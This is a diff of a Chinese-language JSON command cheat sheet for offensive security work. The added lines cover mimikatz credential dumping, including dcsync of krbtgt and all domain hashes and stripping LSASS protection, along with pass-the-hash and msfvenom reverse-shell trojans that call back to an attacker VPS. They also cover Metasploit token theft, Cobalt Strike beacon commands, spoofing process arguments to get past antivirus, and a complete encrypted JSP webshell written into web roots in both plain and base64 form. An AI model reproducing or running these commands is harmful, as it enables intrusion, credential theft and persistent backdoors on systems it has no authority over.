+							"describe": "获取系统的版本信息，包括操作系统名称、服务包版本、体系结构和版本号"
+						}
+					]
+				},
+				"根据Pid查找进程路径": {
+					"Windows": [
+						{
+							"command": "wmic process get name,executablepath,processid|findstr pid",
+							"describe": "根据进程ID查找进程的名称、路径及ID"
+						}
+					]
+				},
+				"查看磁盘信息": {
+					"Windows": [
+						{
+							"command": "Wmic logicaldisk",
+							"describe": "查看系统中的逻辑磁盘信息"
+						}
+					]
+				},
+				"查看组、hostname等信息": {
+					"Windows": [
+						{
+							"command": "wmic computersystem get Name, Domain, Manufacturer, Model, Username, Roles/format:list",
+							"describe": "获取计算机系统的名称、域、制造商、型号、用户名和角色信息"
+						}
+					]
 				}
-			]
-		},
-		"meterpreter把目标的3389端口转发到vps的6666端口": {
-			"Windows": [
-				{
-					"command": "portfwd add -l 6666 -p 3389 -r 127.0.0.1",
-					"describe": "在meterpreter会话中，将目标机器的3389端口转发到VPS的6666端口"
-				}
-			]
-		},
-		".net静默安装": {
-			"Windows": [
-				{
-					"command": "dotNetFx40_Full_x86_x64.exe /q /norestart /ChainingPackage FullX64Bootstrapper",
-					"describe": "以静默模式安装.NET Framework 4.0"
-				}
-			]
-		},
-		"lcx端口转发-本地监听": {
-			"Windows": [
-				{
-					"command": "lcx.exe -listen 110 34567目标执行: lcx.exe -slave vpsip 110 127.0.0.1 3389",
-					"describe": "使用lcx进行本地端口监听和远程端口转发"
-				}
-			]
-		},
-		"扫描web.txt文件的网站标题-本地监听": {
-			"Windows": [
-				{
-					"command": "whatweb -i web.txt -p Title whatweb",
-					"describe": "扫描web.txt文件中的网站，并提取其标题信息"
-				}
-			]
-		},
-		"xfreerdp hash连接rdp": {
-			"Windows": [
-				{
-					"command": "xfreerdp /u:administrator /pth:ccef208c6485269c20db2cad21734fe7 /v:10.20.24.100 /cert-ignore //server 2012",
-					"describe": "使用xfreerdp通过密码哈希连接RDP会话"
-				}
-			]
-		},
-		"runas运行其它账户权限的程序": {
-			"Windows": [
-				{
-					"command": "runas /user:hostname\\username /sa \"cmd.exe\"",
-					"describe": "以指定用户身份运行cmd.exe"
-				}
-			]
-		},
-		"端口转发": {
-			"LCX": {
-				"Linux": [
-					{
-						"command": "lcx -<listen|tran|slave>",
-						"describe": "使用lcx工具进行端口转发"
-					},
-					{
-						"command": "cx -listen 4567 33891 #Attacker",
-						"describe": "在攻击者机器上监听端口4567并将其转发到33891"
-					},
-					{
-						"command": "lcx -slave 111.222.333.444 4567 127.0.0.1 3389 # On the targets",
-						"describe": "在目标机器上将端口4567转发到本地3389端口"
-					}
-				]
 			},
-			"SSH": {
-				"Linux": [
-					{
-						"command": "ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]",
-						"describe": "通过SSH进行端口转发，指定本地端口或远程端口"
-					},
-					{
-						"command": "ssh -L 8080:127.0.0.1:80 root@192.168.1.7 # Local Port",
-						"describe": "将本地8080端口转发到远程服务器的80端口"
-					},
-					{
-						"command": "ssh -R 8080:127.0.0.1:80 root@192.168.1.7 # Remote Port",
-						"describe": "将远程服务器的8080端口转发到本地的80端口"
-					}
-				]
+			"mimikatz": {
+				"抓取密码": {
+					"Windows": [
+						{
+							"command": "mimikatz \"log microsoft.log\" \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"",
+							"describe": "抓取密码"
+						}
+					]
+				},
+				"Pass-The-Hash传递cmd": {
+					"Windows": [
+						{
+							"command": "mimikatz \"privilege::debug\" \"sekurlsa::pth /user:Administrator /domain:offensive.local /ntlm:ccef208c6485269c20db2cad21734fe7 /run:cmd.exe\" \"exit\"",
+							"describe": "Pass-The-Hash传递cmd"
+						}
+					]
+				},
+				"Pass-The-Hash传递mstsc": {
+					"Windows": [
+						{
+							"command": "mimikatz \"privilege::debug\" \"sekurlsa::pth /user:Administrator /domain:offensive.local /ntlm:ccef208c6485269c20db2cad21734fe7 /run:mstsc.exe /restrictedadmin\" \"exit\"",
+							"describe": "Pass-The-Hash传递mstsc"
+						}
+					]
+				},
+				"获取本机hash": {
+					"Windows": [
+						{
+							"command": "mimikatz \"privilege::debug\" \"token::elevate\" \"lsadump::sam\" \"exit\"",
+							"describe": "获取本机hash"
+						}
+					]
+				},
+				"抓取域所有用户hash": {
+					"Windows": [
+						{
+							"command": "mimikatz \"log microsoft.log\" \"lsadump::dcsync /domain:offensive.local /all /csv\" \"exit\"",
+							"describe": "抓取域所有用户hash"
+						}
+					]
+				},
+				"抓取域管Administrator hash": {
+					"Windows": [
+						{
+							"command": "mimikatz \"log microsoft.log\" \"privilege::debug\" \"lsadump::dcsync /domain:offensive.local /user:Administrator\" \"exit\"",
+							"describe": "抓取域管Administrator hash"
+						}
+					]
+				},
+				"抓取域的krbtgt hash": {
+					"Windows": [
+						{
+							"command": "mimikatz \"log microsoft.log\" \"privilege::debug\" \"lsadump::dcsync /domain:offensive.local /user:krbtgt\" \"exit\"",
+							"describe": "抓取域的krbtgt hash"
+						}
+					]
+				},
+				"抓取本机dmp密码": {
+					"Windows": [
+						{
+							"command": "mimikatz \"log microsoft.log\" \"sekurlsa::minidump lsass.dmp\" \"sekurlsa::logonPasswords full\" \"exit\"",
+							"describe": "抓取本机dmp密码"
+						}
+					]
+				},
+				"mimikatz读取注册表导出的hash信息": {
+					"Windows": [
+						{
+							"command": "reg save hklm\\sam c:\\programdata\\sam.hive && reg save hklm\\system c:\\programdata\\system.hive",
+							"describe": "reg导出注册表hash,mimikatz读取注册表导出的hash信息"
+						},
+						{
+							"command": "mimikatz \"log\" \"lsadump::sam /sam:sam.hive /system:system.hive\"  \"exit\"",
+							"describe": "mimikatz读取注册表导出的hash信息"
+						}
+					]
+				},
+				"mimikatz绕过": {
+					"Windows": [
+						{
+							"command": "抓取\nmimikatz # !+\nmimikatz # !processprotect /process:lsass.exe /remove\nmimikatz # privilege::debug\nmimikatz # sekurlsa::logonpasswords\n\n恢复\nmimikatz # !processprotect /process:lsass.exe\nmimikatz # !-\n\n# https://github.com/itm4n/PPLdump\nPPLdump.exe [-v] [-d] [-f] <PROC_NAME|PROC_ID> <DUMP_FILE>\nPPLdump.exe lsass.exe lsass.dmp\nPPLdump.exe -v 720 out.dmp",
+							"describe": "Mimikatz使用数字签名驱动程序来删除内核中 Process对象的保护标志。该文件 mimidrv.sys必须 位于当前文件夹中，才能使用命令加载为内核驱动程序服务!+。然后，你可以使用该命令! processprotect取消保护并最终访问 lsass.exe."
+						}
+					]
+				},
+				"抓取明文的RDP密码": {
+					"Windows": [
+						{
+							"command": "privilege::debug\nts::logonpasswords",
+							"describe": "提升权限并抓取RDP密码"
+						}
+					]
+				},
+				"查看当前用户令牌": {
+					"Windows": [
+						{
+							"command": "token::whoami",
+							"describe": "查看当前用户令牌"
+						}
+					]
+				},
+				"查看当前机器中的所有用户令牌": {
+					"Windows": [
+						{
+							"command": "TOKEN::List",
+							"describe": "查看所有用户令牌"
+						}
+					]
+				},
+				"提升为system令牌": {
+					"Windows": [
+						{
+							"command": "TOKEN::Elevate",
+							"describe": "把当前令牌提升为system令牌"
+						}
+					]
+				},
+				"模拟域管令牌": {
+					"Windows": [
+						{
+							"command": "TOKEN::Elevate /domainadmin",
+							"describe": "模拟域管令牌"
+						}
+					]
+				},
+				"还原令牌到初始状态": {
+					"Windows": [
+						{
+							"command": "token::revert",
+							"describe": "还原令牌到初始状态"
+						}
+					]
+				}
 			},
-			"mknod": {
-				"Linux": [
-					{
-						"command": "mknod backpipe p ; nc -l -p [remote port] < backpipe | nc [local IP] [local port] >backpipe",
-						"describe": "使用mknod创建命名管道，并使用nc进行端口转发"
-					},
-					{
-						"command": "mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.1.1.251 80 >backpipe",
-						"describe": "使用mknod和nc将端口8080的数据转发到目标IP的80端口"
-					},
-					{
-						"command": "mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1>backpipe # Proxy (Port 80 to 8080)",
-						"describe": "创建一个代理，将端口80的数据转发到8080，并记录数据流"
-					},
-					{
-						"command": "mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow & 1>backpipe # Proxy monitor (Port 80 to 8080)",
-						"describe": "创建一个代理监视器，将端口80的数据转发到8080，并监控数据流"
-					}
-				]
+			"metasploit": {
+				"Metasploit 代理socks5": {
+					"Linux": [
+						{
+							"command": "set proxies socks5:127.0.0.1:6667",
+							"describe": "设置Metasploit代理为socks5"
+						}
+					]
+				},
+				"Metasploit生成木马": {
+					"Windows": [
+						{
+							"command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=vpsip LPORT=vpsport -f exe >beacon.exe",
+							"describe": "生成Windows平台的木马"
+						},
+						{
+							"command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=vpsip LPORT=vpsport -f exe >beacon64.exe",
+							"describe": "生成64位Windows平台的木马"
+						}
+					],
+					"Linux": [
+						{
+							"command": "msfvenom -p linux/meterpreter/reverse_tcp LHOST=vpsip LPORT=vpsport -f elf > beacon.elf",
+							"describe": "生成Linux平台的木马"
+						},
+						{
+							"command": "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=vpsip LPORT=vpsport -f elf > beacon64.elf",
+							"describe": "生成64位Linux平台的木马"
+						}
+					]
+				},
+				"加载ms17010 2003系统payload": {
+					"Linux": [
+						{
+							"command": "use exploit/windows/smb/ms17_010_psexec",
+							"describe": "加载MS17-010漏洞的payload"
+						}
+					]
+				},
+				"设置代理开启": {
+					"Linux": [
+						{
+							"command": "set ReverseAllowProxy true",
+							"describe": "设置代理为true"
+						}
+					]
+				},
+				"设置bind连接": {
+					"Linux": [
+						{
+							"command": "set payload windows/shell/bind_tcp",
+							"describe": "设置payload为bind_tcp"
+						}
+					]
+				},
+				"meterpreter端口转发": {
+					"Linux": [
+						{
+							"command": "portfwd add -l 6666 -p 3389 -r 127.0.0.1",
+							"describe": "将目标机的3389端口转发到本地6666端口"
+						},
+						{
+							"command": "portfwd delete -l 6666 -p 3389 -r 127.0.0.1",
+							"describe": "将目标机的3389端口转发到本地6666端口删除"
+						}
+					]
+				},
+				"使用Meterpeter模拟令牌": {
+					"Linux": [
+						{
+							"command": "use incognito",
+							"describe": "使用incognito模块进行令牌伪装"
+						},
+						{
+							"command": "list_tokens -u",
+							"describe": "列出可用令牌"
+						},
+						{
+							"command": "impersonate_token \"NT AUTHORITY\\SYSTEM\"",
+							"describe": "伪装为NT AUTHORITY\\SYSTEM"
+						},
+						{
+							"command": "whoami",
+							"describe": "查看当前身份"
+						}
+					]
+				},
+				"在目标机上隐藏执行": {
+					"Linux": [
+						{
+							"command": "execute -H -f potato.exe",
+							"describe": "在目标机上隐藏执行potato.exe"
+						}
+					]
+				},
+				"cmd进行交互": {
+					"Linux": [
+						{
+							"command": "execute -H -i -f cmd.exe",
+							"describe": "通过meterpreter启动cmd.exe进行交互"
+						}
+					]
+				},
+				"屏幕截屏": {
+					"Linux": [
+						{
+							"command": "screenshot",
+							"describe": "截取目标机屏幕"
+						}
+					]
+				},
+				"令牌窃取": {
+					"Linux": [
+						{
+							"command": "steal_token 1252",
+							"describe": "窃取令牌ID为1252的令牌"
+						}
+					]
+				},
+				"权限提升": {
+					"Linux": [
+						{
+							"command": "getsystem",
+							"describe": "提升权限"
+						}
+					]
+				},
+				"autoroute添加路由": {
+					"Linux": [
+						{
+							"command": "run autoroute –h",
+							"describe": "查看帮助"
+						},
+						{
+							"command": "run autoroute -s 192.168.159.0/24",
+							"describe": "添加到目标环境网络"
+						},
+						{
+							"command": "run autoroute –p",
+							"describe": "查看添加的路由"
+						}
+					]
+				},
+				"meterpreter cmd控制台乱码": {
+					"Linux": [
+						{
+							"command": "chcp 65001",
+							"describe": "设置控制台为UTF-8编码"
+						}
+					]
+				},
+				"meterpreter kiwi抓取域控dcsync": {
+					"Linux": [
+						{
+							"command": "load kiwi",
+							"describe": "加载kiwi模块"
+						},
+						{
+							"command": "kiwi_cmd privilege::debug",
+							"describe": "提升权限"
+						},
+						{
+							"command": "kiwi_cmd lsadump::dcsync /domain:offensive.local /all /csv",
+							"describe": "抓取域控dcsync"
+						}
+					]
+				},
+				"meterpreter kiwi抓取本机密码": {
+					"Linux": [
+						{
+							"command": "load kiwi",
+							"describe": "加载kiwi模块"
+						},
+						{
+							"command": "kiwi_cmd privilege::debug",
+							"describe": "提升权限"
+						},
+						{
+							"command": "kiwi_cmd sekurlsa::logonpasswords",
+							"describe": "抓取本机密码"
+						}
+					]
+				}
 			},
-			"隧道": {
-				"Linux": [
-					{
-						"command": "ssh -D 127.0.0.1:9050 -N [username]@[ip]",
-						"describe": "创建一个SOCKS代理隧道，通过指定的用户名和IP进行连接"
-					},
-					{
-						"command": "proxychains ifconfig",
-						"describe": "通过proxychains命令查看网络接口配置，检查代理设置"
-					}
-				]
+			"cobaltstrike": {
+				"argue 进程参数欺骗": {
+					"Windows": [
+						{
+							"command": "argue [command] [fake arguments]\nargue 命令 假参数 欺骗某个命令参数\n\nargue [command]\nargue 命令 取消欺骗某个命令参数",
+							"describe": "利用这个也可以绕过360添加用户（非核晶模式非x86）比如:\nargue net1 /hello /hello /hello /hello /hello\nrun net1 user admin 123451 /add\n注：假参数需要比真命令长"
+						}
+					]
+				},
+				"execute-assembly 内存执行C#可执行文件": {
+					"Windows": [
+						{
+							"command": "execute-assembly [/path/to/file.exe] [arguments]",
+							"describe": "execute-assembly是CoabltStrike的重要功能,在获取beacon后,只需要编译完成的C#可执行文件拷贝到cobalestrike本地目录,然后执行 \n即可在beacon内存执行,并获取可执行文件的输出."
+						}
+					]
+				},
+				"CobaltStrike常见命令": {
+					"Windows": [
+						{
+							"command": "BeaconCommands\n===============\n    Command                   Description\n    -------                   -----------\n    browserpivot              注入受害者浏览器进程\n    bypassuac                 绕过UAC\n    cancel                    取消正在进行的下载\n    cd                        切换目录\n    checkin                   强制让被控端回连一次\n    clear                     清除beacon内部的任务队列\n    connect                   Connect to a Beacon peerover TCP\n    covertvpn                 部署Covert VPN客户端\n    cp                        复制文件\n    dcsync                    从DC中提取密码哈希\n    desktop                   远程VNC\n    dllinject                 反射DLL注入进程\n    dllload                   使用LoadLibrary将DLL加载到进程中\n    download                  下载文件\n    downloads                 列出正在进行的文件下载\n    drives                    列出目标盘符\n    elevate                   尝试提权\n   execute                   在目标上执行程序(无输出)\n    execute-assembly          在目标上内存中执行本地.NET程序\n    exit                      退出beacon\n    getprivs                  Enable system privileges oncurrent token\n    getsystem                 尝试获取SYSTEM权限\n    getuid                    获取用户ID\n    hashdump                  转储密码哈希值\n    help                      帮助\n    inject                    在特定进程中生成会话\n    jobkill                   杀死一个后台任务\n    jobs                      列出后台任务\n    kerberos_ccache_use       从ccache文件中导入票据应用于此会话\n    kerberos_ticket_purge     清除当前会话的票据\n    kerberos_ticket_use       从ticket文件中导入票据应用于此会话\n    keylogger                 键盘记录\n    kill                      结束进程\n    link                      Connect to a Beacon peerover a named pipe\n    logonpasswords            使用mimikatz转储凭据和哈希值\n    ls                        列出文件\n    make_token                创建令牌以传递凭据\n    mimikatz                  运行mimikatz\n    mkdir                     创建一个目录\n    mode dns                  使用DNS A作为通信通道(仅限DNS beacon)\n    mode dns-txt              使用DNS TXT作为通信通道(仅限D beacon)\n    mode dns6                 使用DNS AAAA作为通信通道(仅限DNS beacon)\n    mode http                 使用HTTP作为通信通道\n    mv                        移动文件\n    net                       net命令\n    note                      备注      \n    portscan                  进行端口扫描\n    powerpick                 通过Unmanaged PowerShell执行命令\n    powershell                通过powershell.exe执行命令\n    powershell-import         导入powershell脚本\n    ppid                      Set parent PID forspawned post-ex jobs\n    ps                        显示进程列表\n    psexec                    Use a service to spawn asession on a host\n    psexec_psh                Use PowerShell to spawn asession on a host\n    psinject                  在特定进程中执行PowerShell命令\n    pth                       使用Mimikatz进行传递哈希\n    pwd                       当前目录位置\n    reg                       Query the registry\n    rev2self                  恢复原始令牌\n    rm                        删除文件或文件夹\n    rportfwd                  端口转发\n    run                       在目标上执行程序(返回输出)\n    runas                     以另一个用户权限执行程序\n    runasadmin                在高权限下执行程序\n    runu                      Execute a program underanother PID\n    screenshot                屏幕截图\n    setenv                    设置环境变量\n    shell                     cmd执行命令\n    shinject                  将shellcode注入进程\n    shspawn                   生成进程并将shellcode注入其中\n    sleep                     设置睡眠延迟时间\n    socks                     启动SOCKS4代理\n    socks stop                停止SOCKS4\n    spawn                     Spawn a session\n    spawnas                   Spawn a session as anotheruser\n    spawnto                  Set executable tospawn processes into\n    spawnu                    Spawn a session underanother PID\n    ssh                       使用ssh连接远程主机\n    ssh-key                   使用密钥连接远程主机\n    steal_token               从进程中窃取令牌\n    timestomp                 将一个文件时间戳应用到另一个文件\n    unlink                    Disconnect from parentBeacon\n    upload                    上传文件\n    wdigest                   使用mimikatz转储明文凭据\n    winrm                     使用WinRM在主机上生成会话\n    wmi                       使用WMI在主机上生成会话\n    argue                     进程参数欺骗",
+							"describe": "CobaltStrike常见命令"
+						}
+					]
+				}
 			}
-		}
-	},
-	"其他常用命令": {
-		"压缩文件": {
-			"Windows": [
-				{
-					"command": "7z.exe a OutputFile InputFile",
-					"describe": "使用7-Zip工具将InputFile压缩成OutputFile。"
-				},
-				{
-					"command": "rar.exe a OutputFile InputFile",
-					"describe": "使用RAR工具将InputFile压缩成OutputFile。"
-				},
-				{
-					"command": "powershell Compress-Archive -Path {source} -DestinationPath {destination}",
-					"describe": "使用 PowerShell 的 Compress-Archive 命令压缩文件或文件夹。{source} 是源文件或文件夹的路径，{destination} 是压缩文件的路径。"
-				},
-				{
-					"command": "tar -a -cf {destination} {source}",
-					"describe": "使用 tar 工具创建一个压缩归档文件。{source} 是要压缩的文件或文件夹，{destination} 是生成的压缩文件路径。"
-				}
-			],
-			"Linux": [
-				{
-					"command": "tar -cvzf {destination}.tar.gz {source}",
-					"describe": "使用 tar 工具创建一个 gzip 压缩的归档文件。{source} 是要压缩的文件或文件夹，{destination} 是生成的压缩文件的基本名称。"
-				},
-				{
-					"command": "zip -r {destination}.zip {source}",
-					"describe": "使用 zip 工具创建一个压缩文件。{source} 是要压缩的文件或文件夹，{destination} 是生成的压缩文件路径。"
-				}
-			]
 		},
-		"解压文件": {
-			"Windows": [
-				{
-					"command": "7z.exe x InputFile OutputFile",
-					"describe": "使用7-Zip工具将InputFile解压到OutputFile。"
+		"常用命令": {
+			"Web渗透命令": {
+				"转义写马问题": {
+					"Windows": [
+						{
+							"command": "echo ^<%! String xc=\\\"d8ea7326e6ec5916\\\"; String pass=\\\"pass123\\\"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(\\\"AES\\\");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),\\\"AES\\\"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance(\\\"MD5\\\");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName(\\\"java.util.Base64\\\");Object Encoder = base64.getMethod(\\\"getEncoder\\\", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod(\\\"encodeToString\\\", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName(\\\"sun.misc.BASE64Encoder\\\"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod(\\\"encode\\\", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName(\\\"java.util.Base64\\\");Object decoder = base64.getMethod(\\\"getDecoder\\\", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod(\\\"decode\\\", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName(\\\"sun.misc.BASE64Decoder\\\"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod(\\\"decodeBuffer\\\", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%^>^<%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute(\\\"payload\\\")==null){session.setAttribute(\\\"payload\\\",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute(\\\"parameters\\\",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute(\\\"payload\\\")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}%^> >/tomcat/webapps/ROOT/1.jsp",
+							"describe": "在Windows系统中，通过cmd命令将一个包含Java代码的payload写入到Tomcat的webapps目录下的1.jsp文件中。"
+						}
+					],
+					"Linux": [
+						{
+							"command": "echo PCUhIFN0cmluZyB4Yz0iZDhlYTczMjZlNmVjNTkxNiI7IFN0cmluZyBwYXNzPSJwYXNzMTIzIjsgU3RyaW5nIG1kNT1tZDUocGFzcyt4Yyk7IGNsYXNzIFggZXh0ZW5kcyBDbGFzc0xvYWRlcntwdWJsaWMgWChDbGFzc0xvYWRlciB6KXtzdXBlcih6KTt9cHVibGljIENsYXNzIFEoYnl0ZVtdIGNiKXtyZXR1cm4gc3VwZXIuZGVmaW5lQ2xhc3MoY2IsIDAsIGNiLmxlbmd0aCk7fSB9cHVibGljIGJ5dGVbXSB4KGJ5dGVbXSBzLGJvb2xlYW4gbSl7IHRyeXtqYXZheC5jcnlwdG8uQ2lwaGVyIGM9amF2YXguY3J5cHRvLkNpcGhlci5nZXRJbnN0YW5jZSgiQUVTIik7Yy5pbml0KG0/MToyLG5ldyBqYXZheC5jcnlwdG8uc3BlYy5TZWNyZXRLZXlTcGVjKHhjLmdldEJ5dGVzKCksIkFFUyIpKTtyZXR1cm4gYy5kb0ZpbmFsKHMpOyB9Y2F0Y2ggKEV4Y2VwdGlvbiBlKXtyZXR1cm4gbnVsbDsgfX0gcHVibGljIHN0YXRpYyBTdHJpbmcgbWQ1KFN0cmluZyBzKSB7U3RyaW5nIHJldCA9IG51bGw7dHJ5IHtqYXZhLnNlY3VyaXR5Lk1lc3NhZ2VEaWdlc3QgbTttID0gamF2YS5zZWN1cml0eS5NZXNzYWdlRGlnZXN0LmdldEluc3RhbmNlKCJNRDUiKTttLnVwZGF0ZShzLmdldEJ5dGVzKCksIDAsIHMubGVuZ3RoKCkpO3JldCA9IG5ldyBqYXZhLm1hdGguQmlnSW50ZWdlcigxLCBtLmRpZ2VzdCgpKS50b1N0cmluZygxNikudG9VcHBlckNhc2UoKTt9IGNhdGNoIChFeGNlcHRpb24gZSkge31yZXR1cm4gcmV0OyB9IHB1YmxpYyBzdGF0aWMgU3RyaW5nIGJhc2U2NEVuY29kZShieXRlW10gYnMpIHRocm93cyBFeGNlcHRpb24ge0NsYXNzIGJhc2U2NDtTdHJpbmcgdmFsdWUgPSBudWxsO3RyeSB7YmFzZTY0PUNsYXNzLmZvck5hbWUoImphdmEudXRpbC5CYXNlNjQiKTtPYmplY3QgRW5jb2RlciA9IGJhc2U2NC5nZXRNZXRob2QoImdldEVuY29kZXIiLCBudWxsKS5pbnZva2UoYmFzZTY0LCBudWxsKTt2YWx1ZSA9IChTdHJpbmcpRW5jb2Rlci5nZXRDbGFzcygpLmdldE1ldGhvZCgiZW5jb2RlVG9TdHJpbmciLCBuZXcgQ2xhc3NbXSB7IGJ5dGVbXS5jbGFzcyB9KS5pbnZva2UoRW5jb2RlciwgbmV3IE9iamVjdFtdIHsgYnMgfSk7fSBjYXRjaCAoRXhjZXB0aW9uIGUpIHt0cnkgeyBiYXNlNjQ9Q2xhc3MuZm9yTmFtZSgic3VuLm1pc2MuQkFTRTY0RW5jb2RlciIpOyBPYmplY3QgRW5jb2RlciA9IGJhc2U2NC5uZXdJbnN0YW5jZSgpOyB2YWx1ZSA9IChTdHJpbmcpRW5jb2Rlci5nZXRDbGFzcygpLmdldE1ldGhvZCgiZW5jb2RlIiwgbmV3IENsYXNzW10geyBieXRlW10uY2xhc3MgfSkuaW52b2tlKEVuY29kZXIsIG5ldyBPYmplY3RbXSB7IGJzIH0pO30gY2F0Y2ggKEV4Y2VwdGlvbiBlMikge319cmV0dXJuIHZhbHVlOyB9IHB1YmxpYyBzdGF0aWMgYnl0ZVtdIGJhc2U2NERlY29kZShTdHJpbmcgYnMpIHRocm93cyBFeGNlcHRpb24ge0NsYXNzIGJhc2U2NDtieXRlW10gdmFsdWUgPSBudWxsO3RyeSB7YmFzZTY0PUNsYXNzLmZvck5hbWUoImphdmEudXRpbC5CYXNlNjQiKTtPYmplY3QgZGVjb2RlciA9IGJhc2U2NC5nZXRNZXRob2QoImdldERlY29kZXIiLCBudWxsKS5pbnZva2UoYmFzZTY0LCBudWxsKTt2YWx1ZSA9IChieXRlW10pZGVjb2Rlci5nZXRDbGFzcygpLmdldE1ldGhvZCgiZGVjb2RlIiwgbmV3IENsYXNzW10geyBTdHJpbmcuY2xhc3MgfSkuaW52b2tlKGRlY29kZXIsIG5ldyBPYmplY3RbXSB7IGJzIH0pO30gY2F0Y2ggKEV4Y2VwdGlvbiBlKSB7dHJ5IHsgYmFzZTY0PUNsYXNzLmZvck5hbWUoInN1bi5taXNjLkJBU0U2NERlY29kZXIiKTsgT2JqZWN0IGRlY29kZXIgPSBiYXNlNjQubmV3SW5zdGFuY2UoKTsgdmFsdWUgPSAoYnl0ZVtdKWRlY29kZXIuZ2V0Q2xhc3MoKS5nZXRNZXRob2QoImRlY29kZUJ1ZmZlciIsIG5ldyBDbGFzc1tdIHsgU3RyaW5nLmNsYXNzIH0pLmludm9rZShkZWNvZGVyLCBuZXcgT2JqZWN0W10geyBicyB9KTt9IGNhdGNoIChFeGNlcHRpb24gZTIpIHt9fXJldHVybiB2YWx1ZTsgfSU+PCV0cnl7Ynl0ZVtdIGRhdGE9YmFzZTY0RGVjb2RlKHJlcXVlc3QuZ2V0UGFyYW1ldGVyKHBhc3MpKTtkYXRhPXgoZGF0YSwgZmFsc2UpO2lmIChzZXNzaW9uLmdldEF0dHJpYnV0ZSgicGF5bG9hZCIpPT1udWxsKXtzZXNzaW9uLnNldEF0dHJpYnV0ZSgicGF5bG9hZCIsbmV3IFgodGhpcy5nZXRDbGFzcygpLmdldENsYXNzTG9hZGVyKCkpLlEoZGF0YSkpO31lbHNle3JlcXVlc3Quc2V0QXR0cmlidXRlKCJwYXJhbWV0ZXJzIixkYXRhKTtqYXZhLmlvLkJ5dGVBcnJheU91dHB1dFN0cmVhbSBhcnJPdXQ9bmV3IGphdmEuaW8uQnl0ZUFycmF5T3V0cHV0U3RyZWFtKCk7T2JqZWN0IGY9KChDbGFzcylzZXNzaW9uLmdldEF0dHJpYnV0ZSgicGF5bG9hZCIpKS5uZXdJbnN0YW5jZSgpO2YuZXF1YWxzKGFyck91dCk7Zi5lcXVhbHMocGFnZUNvbnRleHQpO3Jlc3BvbnNlLmdldFdyaXRlcigpLndyaXRlKG1kNS5zdWJzdHJpbmcoMCwxNikpO2YudG9TdHJpbmcoKTtyZXNwb25zZS5nZXRXcml0ZXIoKS53cml0ZShiYXNlNjRFbmNvZGUoeChhcnJPdXQudG9CeXRlQXJyYXkoKSwgdHJ1ZSkpKTtyZXNwb25zZS5nZXRXcml0ZXIoKS53cml0ZShtZDUuc3Vic3RyaW5nKDE2KSk7fSB9Y2F0Y2ggKEV4Y2VwdGlvbiBlKXt9CiU+ |base64 -d >/var/www/html/123.jsp",
+							"describe": "在Linux系统中执行base64编码的写马命令(pass123:key123)"
+						}
+					]
 				},
-				{
-					"command": "rar.exe x InputFile OutputFile",
-					"describe": "使用RAR工具将InputFile解压到OutputFile。"
+				"中文路径网站写webshell": {
+					"Windows": [
+						{
+							"command": "dir /s /b E:\\index.php > E:\\www\\1.txt && (for /f \"usebackq delims=\" %a in (\"E:\\www\\1.txt\") do (copy E:\\www\\cmd.php \"%~dpa\"))",
+							"describe": "网站路径中文问题 递归搜索E盘的index.php然后输出到1.txt然后把cmd.php复制到文件1.txt路径所在目录。"
+						}
+					]
 				},
-				{
-					"command": "powershell Expand-Archive -Path {source} -DestinationPath {destination}",
-					"describe": "使用 PowerShell 的 Expand-Archive 命令解压文件。{source} 是压缩文件的路径，{destination} 是解压后的目标路径。"
+				"mssql查找数据库配置文件": {
+					"Windows": [
+						{
+							"command": "findstr /c:\"User Id=\" /c:\"Password=\" /si web.config >> tmp.log\nfindstr /c:\"uid=\" /c:\"Password=\" /si web.config >> tmp.log",
+							"describe": "查找web.config中的数据库配置文件"
+						}
+					]
 				},
-				{
-					"command": "tar -xf {source} -C {destination}",
-					"describe": "使用 tar 工具解压归档文件。{source} 是压缩文件的路径，{destination} 是解压后的目标路径。"
-				}
-			],
-			"Linux": [
-				{
-					"command": "tar -cvzf {destination}.tar.gz {source}",
-					"describe": "使用 tar 工具创建一个 gzip 压缩的归档文件。{source} 是要压缩的文件或文件夹，{destination} 是生成的压缩文件的基本名称。"
+				"iIS相关操作": {
+					"查看 IIS 绑定的网站": {
+						"Windows": [
+							{
+								"command": "%windir%\\system32\\inetsrv\\appcmd.exe list sites",
+								"describe": "查看 IIS 绑定的网站"
+							}
+						]
+					},
+					"查看 Site ID 为 1 的物理路径": {
+						"Windows": [
